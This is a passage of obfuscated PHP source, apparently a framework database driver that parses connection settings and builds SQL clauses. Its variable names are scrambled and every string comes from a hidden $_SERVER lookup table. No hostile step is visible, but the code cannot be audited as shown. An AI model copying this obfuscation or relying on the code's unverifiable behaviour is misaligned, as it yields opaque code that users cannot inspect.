ucwords(strtolower($d†Ú–æä[$a•ƒ‡ Øò[875]])); $Eâí©Ó²® = $a•ƒ‡ Øò[877] . $this->dbType; if (class_exists($Eâí©Ó²®)) { $c³¶ˆê¥“‚ = new $Eâí©Ó²®($d†Ú–æä); if ($a•ƒ‡ Øò[720] != strtolower($d†Ú–æä[$a•ƒ‡ Øò[875]])) { $c³¶ˆê¥“‚->dbType = strtoupper($this->dbType); } else { $c³¶ˆê¥“‚->dbType = $this->_getDsnType($d†Ú–æä[$a•ƒ‡ Øò[827]]); } } else { think_exception(think_lang($a•ƒ‡ Øò[878]) . $a•ƒ‡ Øò[879] . $Eâí©Ó²®); } goto F¹Š†•Ì±ğ; FÍ½ØƒœõÄ: } public function __call($c£µš³¥Ù´, $cÉ¶‰Î©Ë°) { if (method_exists($this, $c£µš³¥Ù´)) { return call_user_func_array(array($this, $c£µš³¥Ù´), $cÉ¶‰Î©Ë°); } } protected function _getDsnType($CÌİ‹®ê) { $bÃ¥»Óº„¼ = explode($_SERVER[¼€¼ˆ¦‚¡][4], $CÌİ‹®ê); $bã•Ì›Šøø = strtoupper(trim($bÃ¥»Óº„¼[0])); return $bã•Ì›Šøø; } private function parseConfig($eÅßô‘ô³ = '') { $Eî¸Úä¶Á =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($eÅßô‘ô³) && is_string($eÅßô‘ô³)) { $eÅßô‘ô³ = $this->parseDSN($eÅßô‘ô³); } elseif (is_array($eÅßô‘ô³)) { $eÅßô‘ô³ = array_change_key_case($eÅßô‘ô³); $eÅßô‘ô³ = array($Eî¸Úä¶Á[875] => $eÅßô‘ô³[$Eî¸Úä¶Á[719]], $Eî¸Úä¶Á[800] => $eÅßô‘ô³[$Eî¸Úä¶Á[880]], $Eî¸Úä¶Á[801] => $eÅßô‘ô³[$Eî¸Úä¶Á[881]], $Eî¸Úä¶Á[798] => $eÅßô‘ô³[$Eî¸Úä¶Á[882]], $Eî¸Úä¶Á[799] => $eÅßô‘ô³[$Eî¸Úä¶Á[883]], $Eî¸Úä¶Á[17] => $eÅßô‘ô³[$Eî¸Úä¶Á[884]], $Eî¸Úä¶Á[827] => $eÅßô‘ô³[$Eî¸Úä¶Á[721]], $Eî¸Úä¶Á[13] => isset($eÅßô‘ô³[$Eî¸Úä¶Á[885]]) ? $eÅßô‘ô³[$Eî¸Úä¶Á[885]] : array()); } elseif (empty($eÅßô‘ô³)) { if (think_config($Eî¸Úä¶Á[886]) && $Eî¸Úä¶Á[720] != strtolower(think_config($Eî¸Úä¶Á[887]))) { $eÅßô‘ô³ = $this->parseDSN(think_config($Eî¸Úä¶Á[886])); } else { $eÅßô‘ô³ = array($Eî¸Úä¶Á[875] => think_config($Eî¸Úä¶Á[887]), $Eî¸Úä¶Á[800] => think_config($Eî¸Úä¶Á[888]), $Eî¸Úä¶Á[801] => think_config($Eî¸Úä¶Á[889]), $Eî¸Úä¶Á[798] => think_config($Eî¸Úä¶Á[890]), $Eî¸Úä¶Á[799] => think_config($Eî¸Úä¶Á[891]), $Eî¸Úä¶Á[17] => think_config($Eî¸Úä¶Á[234]), $Eî¸Úä¶Á[827] => think_config($Eî¸Úä¶Á[886]), $Eî¸Úä¶Á[13] => think_config($Eî¸Úä¶Á[892])); } } return $eÅßô‘ô³; } protected function initConnect($AÄ£Éæ½Û = true) { if (1 == think_config($_SERVER[¼€¼ˆ¦‚¡][18])) { $this->_linkID = $this->multiConnect($AÄ£Éæ½Û); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($F›œÄÂÄ‡é = false) { $aœ‰ß‡Û…“ =& $_SERVER[¼€¼ˆ¦‚¡]; static $eµíì¡¡À = array(); if (empty($eµíì¡¡À)) { foreach ($this->config as $BóÏ¿ğ¸‰µ => $BÉÄŞìÂàÇ) { $eµíì¡¡À[$BóÏ¿ğ¸‰µ] = explode($aœ‰ß‡Û…“[47], $BÉÄŞìÂàÇ); } } if (think_config($aœ‰ß‡Û…“[893])) { if ($F›œÄÂÄ‡é) { $e—Ìªè‘Ò = floor(mt_rand(0, think_config($aœ‰ß‡Û…“[894]) - 1)); } else { if (is_numeric(think_config($aœ‰ß‡Û…“[895]))) { $e—Ìªè‘Ò = think_config($aœ‰ß‡Û…“[895]); } else { $e—Ìªè‘Ò = floor(mt_rand(think_config($aœ‰ß‡Û…“[894]), count($eµíì¡¡À[$aœ‰ß‡Û…“[798]]) - 1)); } } } else { $e—Ìªè‘Ò = floor(mt_rand(0, count($eµíì¡¡À[$aœ‰ß‡Û…“[798]]) - 1)); } $c¬ˆÊØí = array($aœ‰ß‡Û…“[800] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[800]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[800]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[800]][0], $aœ‰ß‡Û…“[801] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[801]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[801]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[801]][0], $aœ‰ß‡Û…“[798] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[798]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[798]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[798]][0], $aœ‰ß‡Û…“[799] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[799]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[799]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[799]][0], $aœ‰ß‡Û…“[17] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[17]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[17]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[17]][0], $aœ‰ß‡Û…“[827] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[827]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[827]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[827]][0], $aœ‰ß‡Û…“[13] => isset($eµíì¡¡À[$aœ‰ß‡Û…“[13]][$e—Ìªè‘Ò]) ? $eµíì¡¡À[$aœ‰ß‡Û…“[13]][$e—Ìªè‘Ò] : $eµíì¡¡À[$aœ‰ß‡Û…“[13]][0]); return $this->connect($c¬ˆÊØí, $e—Ìªè‘Ò); } public function parseDSN($b‚®ôİÂò) { $D¡³›‰Ï¿‘ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($b‚®ôİÂò)) { return !1; } $E·æƒ’Ä = parse_url($b‚®ôİÂò); if ($E·æƒ’Ä[$D¡³›‰Ï¿‘[168]]) { $a­Ä‚† = array($D¡³›‰Ï¿‘[875] => $E·æƒ’Ä[$D¡³›‰Ï¿‘[168]], $D¡³›‰Ï¿‘[800] => isset($E·æƒ’Ä[$D¡³›‰Ï¿‘[535]]) ? $E·æƒ’Ä[$D¡³›‰Ï¿‘[535]] : $D¡³›‰Ï¿‘[33], $D¡³›‰Ï¿‘[801] => isset($E·æƒ’Ä[$D¡³›‰Ï¿‘[896]]) ? $E·æƒ’Ä[$D¡³›‰Ï¿‘[896]] : $D¡³›‰Ï¿‘[33], $D¡³›‰Ï¿‘[798] => isset($E·æƒ’Ä[$D¡³›‰Ï¿‘[169]]) ? $E·æƒ’Ä[$D¡³›‰Ï¿‘[169]] : $D¡³›‰Ï¿‘[33], $D¡³›‰Ï¿‘[799] => isset($E·æƒ’Ä[$D¡³›‰Ï¿‘[170]]) ? $E·æƒ’Ä[$D¡³›‰Ï¿‘[170]] : $D¡³›‰Ï¿‘[33], $D¡³›‰Ï¿‘[17] => isset($E·æƒ’Ä[$D¡³›‰Ï¿‘[75]]) ? substr($E·æƒ’Ä[$D¡³›‰Ï¿‘[75]], 1) : $D¡³›‰Ï¿‘[33]); } else { preg_match($D¡³›‰Ï¿‘[897], trim($b‚®ôİÂò), $f–ø‡Ş·Ûƒ); $a­Ä‚† = array($D¡³›‰Ï¿‘[875] => $f–ø‡Ş·Ûƒ[1], $D¡³›‰Ï¿‘[800] => $f–ø‡Ş·Ûƒ[2], $D¡³›‰Ï¿‘[801] => $f–ø‡Ş·Ûƒ[3], $D¡³›‰Ï¿‘[798] => $f–ø‡Ş·Ûƒ[4], $D¡³›‰Ï¿‘[799] => $f–ø‡Ş·Ûƒ[5], $D¡³›‰Ï¿‘[17] => $f–ø‡Ş·Ûƒ[6]); } $a­Ä‚†[$D¡³›‰Ï¿‘[827]] = $D¡³›‰Ï¿‘[33]; return $a­Ä‚†; } protected function debug() { $FƒäåœÀî· =& $_SERVER[¼€¼ˆ¦‚¡]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $FƒäåœÀî·[898]; if (think_config($FƒäåœÀî·[899])) { think_status($FƒäåœÀî·[900]); think_trace($this->queryStr . $FƒäåœÀî·[901] . think_status($FƒäåœÀî·[20], $FƒäåœÀî·[900], 6) . $FƒäåœÀî·[902], $FƒäåœÀî·[33], $FƒäåœÀî·[903]); } } protected function parseLock($aÙ‡ö©³ßÌ = false) { $AŠòµôšÃ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$aÙ‡ö©³ßÌ) { return $AŠòµôšÃ[33]; } if ($AŠòµôšÃ[829] == $this->dbType) { return $AŠòµôšÃ[904]; } return $AŠòµôšÃ[905]; } protected function parseSet($f—ó´—ÛÑê) { $DÖƒ¢§â² =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($f—ó´—ÛÑê as $b†äö·† => $B…§÷Úé…‚) { if (is_array($B…§÷Úé…‚) && $DÖƒ¢§â²[285] == $B…§÷Úé…‚[0]) { $A¼êè”Ûˆ‹[] = $this->parseKey($b†äö·†) . $DÖƒ¢§â²[906] . $B…§÷Úé…‚[1]; } elseif (is_scalar($B…§÷Úé…‚) || is_null($B…§÷Úé…‚)) { $A¼êè”Ûˆ‹[] = $this->parseKey($b†äö·†) . $DÖƒ¢§â²[906] . $this->parseValue($B…§÷Úé…‚); } } return $DÖƒ¢§â²[907] . implode($DÖƒ¢§â²[47], $A¼êè”Ûˆ‹); } protected function bindParam($DÖ»ÊºÕâœ, $A²­Ï¢á†Ï) { $this->bind[$_SERVER[¼€¼ˆ¦‚¡][4] . $DÖ»ÊºÕâœ] = $A²­Ï¢á†Ï; } protected function parseBind($D…Ñ²Öº¶¯) { $D…Ñ²Öº¶¯ = array_merge($this->bind, $D…Ñ²Öº¶¯); $this->bind = array(); return $D…Ñ²Öº¶¯; } function parseKey(&$Cè­¿È·ŒÙ, $e›×†£ÇÒ˜ = true) { if ($e›×†£ÇÒ˜) { $Cè­¿È·ŒÙ = $this->parseKeyCheck($Cè­¿È·ŒÙ); } return $Cè­¿È·ŒÙ; } function parseKeyCheck($C®µ›‘ğ) { $b¸†œªÏêİ =& $_SERVER[¼€¼ˆ¦‚¡]; $C®µ›‘ğ = trim($C®µ›‘ğ); if (!preg_match($b¸†œªÏêİ[908], $C®µ›‘ğ)) { think_exception($b¸†œªÏêİ[909] . $C®µ›‘ğ); } return $C®µ›‘ğ; } protected function parseValue($AÒÛÙ»ê˜) { $EƒÒ»“ç’¦ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_string($AÒÛÙ»ê˜)) { $AÒÛÙ»ê˜ = $EƒÒ»“ç’¦[868] . $this->escapeString($AÒÛÙ»ê˜) . $EƒÒ»“ç’¦[868]; } elseif (isset($AÒÛÙ»ê˜[0]) && is_string($AÒÛÙ»ê˜[0]) && strtolower($AÒÛÙ»ê˜[0]) == $EƒÒ»“ç’¦[285]) { $AÒÛÙ»ê˜ = $this->escapeString($AÒÛÙ»ê˜[1]); } elseif (is_array($AÒÛÙ»ê˜)) { $AÒÛÙ»ê˜ = array_map(array($this, $EƒÒ»“ç’¦[869]), $AÒÛÙ»ê˜); } elseif (is_bool($AÒÛÙ»ê˜)) { $AÒÛÙ»ê˜ = $AÒÛÙ»ê˜ ? $EƒÒ»“ç’¦[83] : $EƒÒ»“ç’¦[468]; } elseif (is_null($AÒÛÙ»ê˜)) { $AÒÛÙ»ê˜ = $EƒÒ»“ç’¦[99]; } return $AÒÛÙ»ê˜; } protected function parseField($a…¥’•ƒˆ¾) { $c£ÃÕ‚ö—´ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_string($a…¥’•ƒˆ¾) && strpos($a…¥’•ƒˆ¾, $c£ÃÕ‚ö—´[47])) { $a…¥’•ƒˆ¾ = explode($c£ÃÕ‚ö—´[47], $a…¥’•ƒˆ¾); } if (is_array($a…¥’•ƒˆ¾)) { $cù–ç£Ú = array(); foreach ($a…¥’•ƒˆ¾ as $B¾ùæØ¶‘’ => $CîŒËÄôÂÈ) { if (!is_numeric($B¾ùæØ¶‘’)) { $cù–ç£Ú[] = $this->parseKey($B¾ùæØ¶‘’) . $c£ÃÕ‚ö—´[910] . $this->parseKey($CîŒËÄôÂÈ); } else { $cù–ç£Ú[] = $this->parseKey($CîŒËÄôÂÈ); } } $dŒµ¬ííí = implode($c£ÃÕ‚ö—´[47], $cù–ç£Ú); } elseif (is_string($a…¥’•ƒˆ¾) && !empty($a…¥’•ƒˆ¾)) { $dŒµ¬ííí = $a…¥’•ƒˆ¾; } else { $dŒµ¬ííí = $c£ÃÕ‚ö—´[176]; } return $dŒµ¬ííí; } protected function parseTable($c—¸î”ï¯ô) { $fˆå‡ë‰Ïİ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_array($c—¸î”ï¯ô)) { $CæéÚùğÃñ = array(); foreach ($c—¸î”ï¯ô as $fåÜ£Óœ…ñ => $aÈŸÓÉ†–) { if (!is_numeric($fåÜ£Óœ…ñ)) { $CæéÚùğÃñ[] = $this->parseKey($fåÜ£Óœ…ñ) . $fˆå‡ë‰Ïİ[50] . $this->parseKey($aÈŸÓÉ†–); } else { $CæéÚùğÃñ[] = $this->parseKey($fåÜ£Óœ…ñ); } } $c—¸î”ï¯ô = $CæéÚùğÃñ; } elseif (is_string($c—¸î”ï¯ô)) { if (strstr($c—¸î”ï¯ô, $fˆå‡ë‰Ïİ[50])) { return $c—¸î”ï¯ô; } $c—¸î”ï¯ô = explode($fˆå‡ë‰Ïİ[47], $c—¸î”ï¯ô); array_walk($c—¸î”ï¯ô, array($this, $fˆå‡ë‰Ïİ[817])); } return $fˆå‡ë‰Ïİ[911] . trim(implode($fˆå‡ë‰Ïİ[912], $c—¸î”ï¯ô), $fˆå‡ë‰Ïİ[823]) . $fˆå‡ë‰Ïİ[911]; } protected function parseWhere($Eí¼§”£°ó) { $aÃš¤éïš =& $_SERVER[¼€¼ˆ¦‚¡]; $dÔá”²ò¨¡ = $aÃš¤éïš[33]; if (is_string($Eí¼§”£°ó)) { $dÔá”²ò¨¡ = $Eí¼§”£°ó; } else { $Cîšîœ‰õÕ = isset($Eí¼§”£°ó[$aÃš¤éïš[913]]) ? strtoupper($Eí¼§”£°ó[$aÃš¤éïš[913]]) : $aÃš¤éïš[33]; if (in_array($Cîšîœ‰õÕ, array($aÃš¤éïš[914], $aÃš¤éïš[915], $aÃš¤éïš[916]))) { $Cîšîœ‰õÕ = $aÃš¤éïš[50] . $Cîšîœ‰õÕ . $aÃš¤éïš[50]; unset($Eí¼§”£°ó[$aÃš¤éïš[913]]); } else { $Cîšîœ‰õÕ = $aÃš¤éïš[917]; } foreach ($Eí¼§”£°ó as $d‘Ó×Â·‹¿ => $f„³Šéå˜) { $dÔá”²ò¨¡ .= $aÃš¤éïš[265]; if (is_numeric($d‘Ó×Â·‹¿)) { $d‘Ó×Â·‹¿ = $aÃš¤éïš[918]; } if (0 === strpos($d‘Ó×Â·‹¿, $aÃš¤éïš[70])) { $dÔá”²ò¨¡ .= $this->parseThinkWhere($d‘Ó×Â·‹¿, $f„³Šéå˜); } else { if (!preg_match($aÃš¤éïš[919], trim($d‘Ó×Â·‹¿))) { think_exception(think_lang($aÃš¤éïš[920]) . $aÃš¤éïš[4] . $d‘Ó×Â·‹¿); } $dÛ¸ƒš™›‘ = is_array($f„³Šéå˜) && isset($f„³Šéå˜[$aÃš¤éïš[921]]); $d‘Ó×Â·‹¿ = trim($d‘Ó×Â·‹¿); if (strpos($d‘Ó×Â·‹¿, $aÃš¤éïš[271])) { $a¬ÂÒ˜Ï = explode($aÃš¤éïš[271], $d‘Ó×Â·‹¿); $Dé¸ÓÒŠó = array(); foreach ($a¬ÂÒ˜Ï as $eÆƒÔÁºŠ£ => $få®ŠØŠî) { $D†ËÆÆ”œ = $dÛ¸ƒš™›‘ ? $f„³Šéå˜[$eÆƒÔÁºŠ£] : $f„³Šéå˜; $Dé¸ÓÒŠó[] = $aÃš¤éïš[248] . $this->parseWhereItem($this->parseKey($få®ŠØŠî), $D†ËÆÆ”œ) . $aÃš¤éïš[816]; } $dÔá”²ò¨¡ .= implode($aÃš¤éïš[922], $Dé¸ÓÒŠó); } elseif (strpos($d‘Ó×Â·‹¿, $aÃš¤éïš[272])) { $a¬ÂÒ˜Ï = explode($aÃš¤éïš[272], $d‘Ó×Â·‹¿); $Dé¸ÓÒŠó = array(); foreach ($a¬ÂÒ˜Ï as $eÆƒÔÁºŠ£ => $få®ŠØŠî) { $D†ËÆÆ”œ = $dÛ¸ƒš™›‘ ? $f„³Šéå˜[$eÆƒÔÁºŠ£] : $f„³Šéå˜; $Dé¸ÓÒŠó[] = $aÃš¤éïš[248] . $this->parseWhereItem($this->parseKey($få®ŠØŠî), $D†ËÆÆ”œ) . $aÃš¤éïš[816]; } $dÔá”²ò¨¡ .= implode($aÃš¤éïš[917], $Dé¸ÓÒŠó); } else { $dÔá”²ò¨¡ .= $this->parseWhereItem($this->parseKey($d‘Ó×Â·‹¿), $f„³Šéå˜); } } $dÔá”²ò¨¡ .= $aÃš¤éïš[266] . $Cîšîœ‰õÕ; } $dÔá”²ò¨¡ = substr($dÔá”²ò¨¡, 0, -strlen($Cîšîœ‰õÕ)); } return empty($dÔá”²ò¨¡) ? $aÃš¤éïš[33] : $aÃš¤éïš[923] . $dÔá”²ò¨¡; } protected function parseWhereItem($EÁ­ˆÓ£À, $D‘å›äÉíÀ) { $cĞŠ–ÓÀê =& $_SERVER[¼€¼ˆ¦‚¡]; $e¿ŠÄÂ¤Äù = $cĞŠ–ÓÀê[33]; if (is_array($D‘å›äÉíÀ)) { if (is_string($D‘å›äÉíÀ[0])) { $d‹¡êÈ²çø = strtolower($D‘å›äÉíÀ[0]); if (in_array($D‘å›äÉíÀ[0], array($cĞŠ–ÓÀê[906], $cĞŠ–ÓÀê[924], $cĞŠ–ÓÀê[925], $cĞŠ–ÓÀê[926], $cĞŠ–ÓÀê[927], $cĞŠ–ÓÀê[928]))) { $e¿ŠÄÂ¤Äù .= $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $D‘å›äÉíÀ[0] . $cĞŠ–ÓÀê[50] . $this->parseValue($D‘å›äÉíÀ[1]); } elseif (preg_match($cĞŠ–ÓÀê[929], $D‘å›äÉíÀ[0])) { $e¿ŠÄÂ¤Äù .= $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $this->exp[$d‹¡êÈ²çø] . $cĞŠ–ÓÀê[50] . $this->parseValue($D‘å›äÉíÀ[1]); } elseif (preg_match($cĞŠ–ÓÀê[930], $D‘å›äÉíÀ[0])) { if (is_array($D‘å›äÉíÀ[1])) { $dšÅôÓèâÔ = isset($D‘å›äÉíÀ[2]) ? strtoupper($D‘å›äÉíÀ[2]) : $cĞŠ–ÓÀê[915]; if (in_array($dšÅôÓèâÔ, array($cĞŠ–ÓÀê[914], $cĞŠ–ÓÀê[915], $cĞŠ–ÓÀê[916]))) { $AÙÒÀ„óÀÉ = array(); foreach ($D‘å›äÉíÀ[1] as $E‡Ò¡¨Âì•) { $AÙÒÀ„óÀÉ[] = $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $this->exp[$d‹¡êÈ²çø] . $cĞŠ–ÓÀê[50] . $this->parseValue($E‡Ò¡¨Âì•); } $e¿ŠÄÂ¤Äù .= $cĞŠ–ÓÀê[248] . implode($cĞŠ–ÓÀê[50] . $dšÅôÓèâÔ . $cĞŠ–ÓÀê[50], $AÙÒÀ„óÀÉ) . $cĞŠ–ÓÀê[816]; } } else { $e¿ŠÄÂ¤Äù .= $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $this->exp[$d‹¡êÈ²çø] . $cĞŠ–ÓÀê[50] . $this->parseValue($D‘å›äÉíÀ[1]); } } elseif ($cĞŠ–ÓÀê[285] == $d‹¡êÈ²çø) { $e¿ŠÄÂ¤Äù .= $cĞŠ–ÓÀê[814] . $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $D‘å›äÉíÀ[1] . $cĞŠ–ÓÀê[931]; } elseif (preg_match($cĞŠ–ÓÀê[932], $D‘å›äÉíÀ[0])) { if (isset($D‘å›äÉíÀ[2]) && $cĞŠ–ÓÀê[285] == $D‘å›äÉíÀ[2]) { $e¿ŠÄÂ¤Äù .= $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $this->exp[$d‹¡êÈ²çø] . $cĞŠ–ÓÀê[50] . $D‘å›äÉíÀ[1]; } else { if (is_string($D‘å›äÉíÀ[1])) { $D‘å›äÉíÀ[1] = explode($cĞŠ–ÓÀê[47], $D‘å›äÉíÀ[1]); } $E•È†¿å³ = implode($cĞŠ–ÓÀê[47], $this->parseValue($D‘å›äÉíÀ[1])); $e¿ŠÄÂ¤Äù .= $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $this->exp[$d‹¡êÈ²çø] . $cĞŠ–ÓÀê[814] . $E•È†¿å³ . $cĞŠ–ÓÀê[816]; } } elseif (preg_match($cĞŠ–ÓÀê[933], $D‘å›äÉíÀ[0])) { $Aõ‹£Õ†Š = is_string($D‘å›äÉíÀ[1]) ? explode($cĞŠ–ÓÀê[47], $D‘å›äÉíÀ[1]) : $D‘å›äÉíÀ[1]; $e¿ŠÄÂ¤Äù .= $cĞŠ–ÓÀê[814] . $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $this->exp[$d‹¡êÈ²çø] . $cĞŠ–ÓÀê[50] . $this->parseValue($Aõ‹£Õ†Š[0]) . $cĞŠ–ÓÀê[917] . $this->parseValue($Aõ‹£Õ†Š[1]) . $cĞŠ–ÓÀê[266]; } else { think_exception(think_lang($cĞŠ–ÓÀê[920]) . $cĞŠ–ÓÀê[4] . $D‘å›äÉíÀ[0]); } } else { $eòª ÀôÃ× = count($D‘å›äÉíÀ); $D¶ÉÒÕ®Ä¹ = isset($D‘å›äÉíÀ[$eòª ÀôÃ× - 1]) ? strtoupper($D‘å›äÉíÀ[$eòª ÀôÃ× - 1]) : $cĞŠ–ÓÀê[33]; if (in_array($D¶ÉÒÕ®Ä¹, array($cĞŠ–ÓÀê[914], $cĞŠ–ÓÀê[915], $cĞŠ–ÓÀê[916]))) { $eòª ÀôÃ× = $eòª ÀôÃ× - 1; } else { $D¶ÉÒÕ®Ä¹ = $cĞŠ–ÓÀê[914]; } for ($Aê›©µƒ‰½ = 0; $Aê›©µƒ‰½ < $eòª ÀôÃ×; $Aê›©µƒ‰½++) { $Aõ‹£Õ†Š = is_array($D‘å›äÉíÀ[$Aê›©µƒ‰½]) ? $D‘å›äÉíÀ[$Aê›©µƒ‰½][1] : $D‘å›äÉíÀ[$Aê›©µƒ‰½]; if ($cĞŠ–ÓÀê[285] == strtolower($D‘å›äÉíÀ[$Aê›©µƒ‰½][0])) { $e¿ŠÄÂ¤Äù .= $cĞŠ–ÓÀê[248] . $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $Aõ‹£Õ†Š . $cĞŠ–ÓÀê[931] . $D¶ÉÒÕ®Ä¹ . $cĞŠ–ÓÀê[50]; } else { $FÅ–Š¤ù» = is_array($D‘å›äÉíÀ[$Aê›©µƒ‰½]) ? $this->exp[strtolower($D‘å›äÉíÀ[$Aê›©µƒ‰½][0])] : $cĞŠ–ÓÀê[906]; if (!$FÅ–Š¤ù» && is_array($D‘å›äÉíÀ[$Aê›©µƒ‰½]) && in_array($D‘å›äÉíÀ[$Aê›©µƒ‰½][0], array($cĞŠ–ÓÀê[906], $cĞŠ–ÓÀê[924], $cĞŠ–ÓÀê[925], $cĞŠ–ÓÀê[926], $cĞŠ–ÓÀê[927], $cĞŠ–ÓÀê[928]))) { $FÅ–Š¤ù» = $D‘å›äÉíÀ[$Aê›©µƒ‰½][0]; } $e¿ŠÄÂ¤Äù .= $cĞŠ–ÓÀê[248] . $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[50] . $FÅ–Š¤ù» . $cĞŠ–ÓÀê[50] . $this->parseValue($Aõ‹£Õ†Š) . $cĞŠ–ÓÀê[931] . $D¶ÉÒÕ®Ä¹ . $cĞŠ–ÓÀê[50]; } } $e¿ŠÄÂ¤Äù = substr($e¿ŠÄÂ¤Äù, 0, -4); } } else { $e¿ŠÄÂ¤Äù .= $EÁ­ˆÓ£À . $cĞŠ–ÓÀê[934] . $this->parseValue($D‘å›äÉíÀ); } return $e¿ŠÄÂ¤Äù; } protected function parseThinkWhere($a™¶âó×î, $fî„ë‰‰ì¤) { $e¤‚ƒ±Œë¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÏª„ÒË·ó = $e¤‚ƒ±Œë¤[33]; switch ($a™¶âó×î) { case $e¤‚ƒ±Œë¤[339]: $fÏª„ÒË·ó = $fî„ë‰‰ì¤; break; case $e¤‚ƒ±Œë¤[918]: $fÏª„ÒË·ó = is_string($fî„ë‰‰ì¤) ? $fî„ë‰‰ì¤ : substr($this->parseWhere($fî„ë‰‰ì¤), 6); break; case $e¤‚ƒ±Œë¤[935]: parse_str($fî„ë‰‰ì¤, $CÇÜ Ş»”ì); if (isset($CÇÜ Ş»”ì[$e¤‚ƒ±Œë¤[913]])) { $c…ÎÜ¦ËÆ‰ = $e¤‚ƒ±Œë¤[50] . strtoupper($CÇÜ Ş»”ì[$e¤‚ƒ±Œë¤[913]]) . $e¤‚ƒ±Œë¤[50]; unset($CÇÜ Ş»”ì[$e¤‚ƒ±Œë¤[913]]); } else { $c…ÎÜ¦ËÆ‰ = $e¤‚ƒ±Œë¤[917]; } $dª‡»¾Ã³ = array(); foreach ($CÇÜ Ş»”ì as $a™ËØ÷ã© => $c’…¡­ ”) { $dª‡»¾Ã³[] = $this->parseKey($a™ËØ÷ã©) . $e¤‚ƒ±Œë¤[934] . $this->parseValue($c’…¡­ ”); } $fÏª„ÒË·ó = implode($c…ÎÜ¦ËÆ‰, $dª‡»¾Ã³); break; } return $fÏª„ÒË·ó; } protected function parseLimit($F¼äì¿öæ˜) { $C¤¿ÙŸäÊÁ =& $_SERVER[¼€¼ˆ¦‚¡]; return !empty($F¼äì¿öæ˜) ? $C¤¿ÙŸäÊÁ[48] . $F¼äì¿öæ˜ . $C¤¿ÙŸäÊÁ[50] : $C¤¿ÙŸäÊÁ[33]; } protected function parseJoin($F‰ÊÆ«‡) { $Cí›âÕØ =& $_SERVER[¼€¼ˆ¦‚¡]; $a¿ ì‰¾ÏÎ = $Cí›âÕØ[33]; if (!empty($F‰ÊÆ«‡)) { if (is_array($F‰ÊÆ«‡)) { foreach ($F‰ÊÆ«‡ as $dÌí„—§Ê” => $C°®óˆ³‰‘) { if (!1 !== stripos($C°®óˆ³‰‘, $Cí›âÕØ[936])) { $a¿ ì‰¾ÏÎ .= $Cí›âÕØ[50] . $C°®óˆ³‰‘; } else { $a¿ ì‰¾ÏÎ .= $Cí›âÕØ[937] . $C°®óˆ³‰‘; } } } else { $a¿ ì‰¾ÏÎ .= $Cí›âÕØ[937] . $F‰ÊÆ«‡; } } $a¿ ì‰¾ÏÎ = preg_replace($Cí›âÕØ[938], think_config($Cí›âÕØ[841]) . $Cí›âÕØ[939], $a¿ ì‰¾ÏÎ); return $a¿ ì‰¾ÏÎ; } protected function parseOrder($f¾³ ±•ôí) { $fÀÒŠªË‹Ü =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_array($f¾³ ±•ôí)) { $a®±ÍŸƒ‘ = array(); foreach ($f¾³ ±•ôí as $C„à‹ÛÃ˜¤ => $c „ÚÖÌÀ¬) { if (is_numeric($C„à‹ÛÃ˜¤)) { $a®±ÍŸƒ‘[] = $this->parseKey($c „ÚÖÌÀ¬); } else { $c „ÚÖÌÀ¬ = in_array(strtoupper(trim($c „ÚÖÌÀ¬)), array($fÀÒŠªË‹Ü[940], $fÀÒŠªË‹Ü[941])) ? $fÀÒŠªË‹Ü[50] . $c „ÚÖÌÀ¬ : $fÀÒŠªË‹Ü[33]; if (preg_match($fÀÒŠªË‹Ü[942], $C„à‹ÛÃ˜¤)) { $a®±ÍŸƒ‘[] = $this->parseKey($C„à‹ÛÃ˜¤) . $c „ÚÖÌÀ¬; } else { think_exception($fÀÒŠªË‹Ü[943] . $C„à‹ÛÃ˜¤); } } } $f¾³ ±•ôí = implode($fÀÒŠªË‹Ü[47], $a®±ÍŸƒ‘); } return !empty($f¾³ ±•ôí) ? $fÀÒŠªË‹Ü[944] . $f¾³ ±•ôí : $fÀÒŠªË‹Ü[33]; } protected function parseGroup($A°«ê‚‹) { $C§ÍŸÃô•Ñ =& $_SERVER[¼€¼ˆ¦‚¡]; return !empty($A°«ê‚‹) ? $C§ÍŸÃô•Ñ[945] . $A°«ê‚‹ : $C§ÍŸÃô•Ñ[33]; } protected function parseHaving($CÑîİ…î†´) { $bÜ—„™ô§ù =& 